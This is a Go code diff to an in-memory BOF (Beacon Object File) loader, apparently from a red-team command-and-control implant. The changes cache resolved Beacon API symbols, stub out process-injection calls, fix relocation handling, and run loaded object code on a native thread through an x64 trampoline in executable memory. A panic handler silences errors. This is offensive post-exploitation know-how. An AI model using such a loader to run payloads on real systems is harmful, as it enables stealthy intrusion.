@@ -14,6 +14,7 @@ import (
 	"gopher/bof/binutil"
 	"gopher/bof/boffer"
 	"gopher/bof/defwin"
+	"gopher/bof/memory"
 
 	"golang.org/x/sys/windows"
 )
@@ -30,12 +31,26 @@ const (
 )
 
 var (
-	kernel32           = syscall.MustLoadDLL("kernel32.dll")
-	procVirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
-	procVirtualProtect = kernel32.MustFindProc("VirtualProtect")
+	kernel32                = syscall.MustLoadDLL("kernel32.dll")
+	procVirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
+	procVirtualFree         = kernel32.MustFindProc("VirtualFree")
+	procVirtualProtect      = kernel32.MustFindProc("VirtualProtect")
+	procCreateThread        = kernel32.MustFindProc("CreateThread")
+	procWaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
+	procCloseHandle         = kernel32.MustFindProc("CloseHandle")
 )
 
-func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) uintptr {
+const (
+	MEM_RELEASE = 0x8000
+)
+
+func resolveExternalAddress(symbolName string, outChannel chan<- interface{}, cache map[string]uintptr) uintptr {
+
+	if cached, ok := cache[symbolName]; ok {
+
+		return cached
+	}
+
 	if strings.HasPrefix(symbolName, "__imp_") {
 		symbolName = symbolName[6:]
 		// 32 bit import names are __imp__
@@ -57,7 +72,9 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 			case "MessageBoxA":
 				libName = "user32.dll"
 			case string("BeaconOutput"):
-				return windows.NewCallback(boffer.GetCoffOutputForChannel(outChannel))
+				ret := windows.NewCallback(boffer.GetCoffOutputForChannel(outChannel))
+				cache[symbolName] = ret
+				return ret
 			case string("BeaconDataParse"):
 				return windows.NewCallback(boffer.DataParse)
 			case string("BeaconDataInt"):
@@ -69,7 +86,9 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 			case string("BeaconDataExtract"):
 				return windows.NewCallback(boffer.DataExtract)
 			case string("BeaconPrintf"):
-				return windows.NewCallback(boffer.GetCoffPrintfForChannel(outChannel))
+				ret := windows.NewCallback(boffer.GetCoffPrintfForChannel(outChannel))
+				cache[symbolName] = ret
+				return ret
 			case string("BeaconAddValue"):
 				return windows.NewCallback(boffer.AddValue)
 			case string("BeaconGetValue"):
@@ -99,27 +118,39 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 			case string("toWideChar"):
 				return windows.NewCallback(boffer.ToWideChar)
 			case string("BeaconGetSpawnTo"):
-				fallthrough
+				return makeNoOpStub(procName, outChannel)
 			case string("BeaconGetSpawnTemporaryProcess"):
-				fallthrough
+				return makeNoOpStub(procName, outChannel)
 			case string("BeaconInjectProcess"):
-				fallthrough
+				return makeNoOpStub(procName, outChannel)
 			case string("BeaconInjectTemporaryProcess"):
-				fallthrough
+				return makeNoOpStub(procName, outChannel)
 			case string("BeaconCleanupProcess"):
-				fallthrough
+				return makeNoOpStub(procName, outChannel)
 			case string("AxAddScreenshot"):
 				return windows.NewCallback(boffer.AxAddScreenshot(outChannel))
 			case string("AxDownloadMemory"):
 				return windows.NewCallback(boffer.AxDownloadMemory(outChannel))
+			case string("BeaconJobRegister"):
+				ret := windows.NewCallback(boffer.JobRegister)
+				cache[symbolName] = ret
+				return ret
 			default:
 				fmt.Printf("Unknown symbol: %s\n", procName)
 				return 0
 			}
 		}
 
-		libStringPtr, _ := syscall.LoadLibrary(libName)
-		procAddress, _ := syscall.GetProcAddress(libStringPtr, procName)
+		libStringPtr, err := syscall.LoadLibrary(libName)
+		if err != nil {
+			return 0
+		}
+		procAddress, err := syscall.GetProcAddress(libStringPtr, procName)
+		if err != nil {
+			return 0
+		}
+
+		cache[symbolName] = procAddress
 		return procAddress
 	}
 	return 0
@@ -148,36 +179,28 @@ func isImportSymbol(sym *SymbolParsed) bool {
 
 func processRelocation(symbolDefAddress uintptr, sectionAddress uintptr, reloc defwin.Relocation, symbol *SymbolParsed) {
 	symbolOffset := (uintptr)(reloc.VirtualAddress)
-
 	absoluteSymbolAddress := symbolOffset + sectionAddress
 
-	segmentValue := *(*uint32)(unsafe.Pointer(absoluteSymbolAddress))
+	// Apply any addend found at the relocation destination
+	segmentValue := *(*int32)(unsafe.Pointer(absoluteSymbolAddress))
+	symbolDefAddress += uintptr(segmentValue)
 
-	if (symbol.StorageClass == defwin.IMAGE_SYM_CLASS_STATIC && symbol.Value != 0) ||
-		(symbol.StorageClass == defwin.IMAGE_SYM_CLASS_EXTERNAL && symbol.SectionNumber != 0) {
-		symbolOffset = (uintptr)(symbol.Value)
-	} else {
-		symbolDefAddress += (uintptr)(segmentValue)
-	}
-
-	symbolRefAddress := sectionAddress
-
-	//TODO: Handle x86 cases as well
 	switch reloc.Type {
 	case defwin.IMAGE_REL_AMD64_ADDR64:
 		addr := (*uint64)(unsafe.Pointer(absoluteSymbolAddress))
-		fmt.Sprintf("Symbol Ref Address: 0x%x\n", addr)
 		*addr = uint64(symbolDefAddress)
-	case defwin.IMAGE_REL_AMD64_ADDR32NB:
+
+	case defwin.IMAGE_REL_AMD64_ADDR32NB: // RVA
 		addr := (*uint32)(unsafe.Pointer(absoluteSymbolAddress))
-		valueToWrite := symbolDefAddress - (symbolRefAddress + 4 + symbolOffset)
-		fmt.Sprintf("Symbol Ref Address: 0x%x\n", addr)
-		*addr = uint32(valueToWrite)
-	case defwin.IMAGE_REL_AMD64_REL32, defwin.IMAGE_REL_AMD64_REL32_1, defwin.IMAGE_REL_AMD64_REL32_2, defwin.IMAGE_REL_AMD64_REL32_3, defwin.IMAGE_REL_AMD64_REL32_4, defwin.IMAGE_REL_AMD64_REL32_5:
-		relativeSymbolDefAddress := symbolDefAddress - (uintptr)(reloc.Type-4) - (absoluteSymbolAddress + 4)
+		*addr = uint32(symbolDefAddress)
+
+	case defwin.IMAGE_REL_AMD64_REL32, defwin.IMAGE_REL_AMD64_REL32_1, defwin.IMAGE_REL_AMD64_REL32_2,
+		defwin.IMAGE_REL_AMD64_REL32_3, defwin.IMAGE_REL_AMD64_REL32_4, defwin.IMAGE_REL_AMD64_REL32_5:
+		relative := int32(symbolDefAddress - (absoluteSymbolAddress + 4))
 		addr := (*uint32)(unsafe.Pointer(absoluteSymbolAddress))
-		fmt.Sprintf("Symbol Ref Address: 0x%x\n", addr)
-		*addr = uint32(relativeSymbolDefAddress)
+		fmt.Printf("Symbol Ref Address: 0x%x\n", addr)
+		*addr = uint32(relative)
+
 	default:
 		fmt.Printf("Unsupported relocation type: %d\n", reloc.Type)
 	}
@@ -193,7 +216,14 @@ func Load(coffBytes []byte, argBytes []byte) ([]utils.BofMsg, error) {
 }
 
 func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) ([]utils.BofMsg, error) {
+	defer func() {
+		if r := recover(); r != nil {
+			// Panic recovery without logging
+		}
+	}()
+
 	output := make(chan interface{})
+	cache := make(map[string]uintptr)
 
 	parsedCoff := Explore(binutil.WrapByteSlice(coffBytes))
 	parsedCoff.ReadAll()
@@ -221,8 +251,14 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) ([]utils.B
 	}
 
 	for _, section := range parsedCoff.Sections.Array() {
+		// Use the larger of SizeOfRawData and VirtualSize.
+		// This is critical for .bss sections which have VirtualSize > 0 but SizeOfRawData = 0.
 		allocationSize := uintptr(section.SizeOfRawData)
-		if strings.HasPrefix(section.NameString(), ".bss") {
+		if uintptr(section.VirtualSize) > allocationSize {
+			allocationSize = uintptr(section.VirtualSize)
+		}
+		// For .bss sections with Common symbols, use bssSize if larger
+		if strings.HasPrefix(section.NameString(), ".bss") && uintptr(bssSize) > allocationSize {
 			allocationSize = uintptr(bssSize)
 		}
 
@@ -230,7 +266,8 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) ([]utils.B
 			continue
 		}
 
-		addr, err := virtualAlloc(0, allocationSize, MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, PAGE_READWRITE)
+		addr, err := virtualAlloc(0, allocationSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
 		if err != nil {
 			return []utils.BofMsg{}, fmt.Errorf("VirtualAlloc failed: %s", err.Error())
 		}
@@ -249,12 +286,24 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) ([]utils.B
 		sections[section.NameString()] = allocatedSection
 	}
 
-	gotBaseAddress, err := virtualAlloc(0, uintptr(gotSize), MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, PAGE_READWRITE)
+	// If we have Common symbols (bssSize > 0) but no .bss section was found, we must allocate it now.
+	if bssBaseAddress == 0 && bssSize > 0 {
+		addr, err := virtualAlloc(0, uintptr(bssSize), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+		if err != nil {
+			return []utils.BofMsg{}, fmt.Errorf("VirtualAlloc (implicit bss) failed: %s", err.Error())
+		}
+		bssBaseAddress = addr
+	}
+
+	gotBaseAddress, err := virtualAlloc(0, uintptr(gotSize), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if err != nil {
 		return []utils.BofMsg{}, fmt.Errorf("VirtualAlloc failed: %s", err.Error())
 	}
 
 	for _, section := range parsedCoff.Sections.Array() {
+		if section.NumberOfRelocations == 0 {
+			continue
+		}
 		sectionVirtualAddr := sections[section.NameString()].Address
 		fmt.Sprintf("Section: %s\n", section.NameString())
 
@@ -266,13 +315,11 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) ([]utils.B
 				continue
 			}
 
-			symbolTypeString := defwin.MAP_IMAGE_SYM_CLASS[symbol.StorageClass]
-			fmt.Sprintf("0x%08X %s %s\n", reloc.VirtualAddress, symbolTypeString, symbol.NameString())
 			symbolDefAddress := uintptr(0)
 
 			if isSpecialSymbol(symbol) {
 				if isImportSymbol(symbol) {
-					externalAddress := resolveExternalAddress(symbol.NameString(), output)
+					externalAddress := resolveExternalAddress(symbol.NameString(), output, cache)
 
 					if externalAddress == 0 {
 						return []utils.BofMsg{}, fmt.Errorf("failed to resolve external address for symbol: %s", symbol.NameString())
@@ -287,7 +334,9 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) ([]utils.B
 					}
 					copy((*[8]byte)(unsafe.Pointer(symbolDefAddress))[:], (*[8]byte)(unsafe.Pointer(&externalAddress))[:])
 				} else {
+					// Common symbol (uninitialized global)
 					symbolDefAddress = bssBaseAddress + uintptr(bssOffset)
+
 					bssOffset += int(symbol.Value) + 8
 				}
 			} else {
@@ -347,13 +396,80 @@ func invokeMethod(methodName string, argBytes []byte, parsedCoff *File, sectionM
 	// Call the entry point
 	for _, symbol := range parsedCoff.Symbols {
 		if symbol.NameString() == methodName {
+
 			mainSection := parsedCoff.Sections.Array()[symbol.SectionNumber-1]
 			entryPoint := sectionMap[mainSection.NameString()].Address + uintptr(symbol.Value)
 
 			if len(argBytes) == 0 {
 				argBytes = make([]byte, 1)
 			}
-			syscall.SyscallN(entryPoint, uintptr(unsafe.Pointer(&argBytes[0])), uintptr((len(argBytes))))
+
+			// Allocate arguments in unmanaged memory to prevent Go pointer usage in native thread
+			argsSize := uintptr(len(argBytes))
+			argsBuf, _, _ := procVirtualAlloc.Call(0, argsSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+			if argsBuf == 0 {
+				return
+			}
+			memory.MemCpy(argsBuf, uintptr(unsafe.Pointer(&argBytes[0])), uint32(len(argBytes)))
+
+			// Trampoline stub (x64) to adapt CreateThread(Context*) -> go(char* args, int len)
+			trampoline := []byte{
+				0x48, 0x8B, 0x01, // mov rax, [rcx]      ; func_ptr (offset 0)
+				0x48, 0x8B, 0x51, 0x10, // mov rdx, [rcx+16]   ; len (offset 16)
+				0x48, 0x8B, 0x49, 0x08, // mov rcx, [rcx+8]    ; args (offset 8)
+				0x48, 0x83, 0xEC, 0x28, // sub rsp, 40         ; shadow space
+				0xFF, 0xD0, // call rax
+				0x48, 0x83, 0xC4, 0x28, // add rsp, 40
+				0xC3, // ret
+			}
+
+			// Context structure: { func_ptr, args_ptr, len_low, len_high }
+			ctxSize := 24
+			ctxBuf, _, _ := procVirtualAlloc.Call(0, uintptr(ctxSize), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+			if ctxBuf == 0 {
+				return
+			}
+
+			// Fill context
+			*(*uintptr)(unsafe.Pointer(ctxBuf)) = entryPoint
+			*(*uintptr)(unsafe.Pointer(ctxBuf + 8)) = argsBuf
+			*(*uintptr)(unsafe.Pointer(ctxBuf + 16)) = argsSize
+
+			// Allocate executable memory for trampoline
+			trampolineBuf, _, _ := procVirtualAlloc.Call(0, uintptr(len(trampoline)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+			if trampolineBuf == 0 {
+				return
+			}
+			memory.MemCpy(trampolineBuf, uintptr(unsafe.Pointer(&trampoline[0])), uint32(len(trampoline)))
+
+			// Create native thread to execute the BOF
+			hThread, _, _ := procCreateThread.Call(0, 0, trampolineBuf, ctxBuf, 0, 0)
+			if hThread == 0 {
+				return
+			}
+
+			const INFINITE = 0xFFFFFFFF
+			procWaitForSingleObject.Call(hThread, INFINITE)
+
+			// Cleanup resources
+			procCloseHandle.Call(hThread)
+
+			if argsBuf != 0 {
+				procVirtualFree.Call(argsBuf, 0, MEM_RELEASE)
+			}
+			if ctxBuf != 0 {
+				procVirtualFree.Call(ctxBuf, 0, MEM_RELEASE)
+			}
+			if trampolineBuf != 0 {
+				procVirtualFree.Call(trampolineBuf, 0, MEM_RELEASE)
+			}
 		}
 	}
+}
+
+func makeNoOpStub(name string, outChannel chan<- interface{}) uintptr {
+	return windows.NewCallback(func(a, b, c, d, e, f, g, h, i, j, k, l uintptr) uintptr {
+
+		return 0
+	})
 }
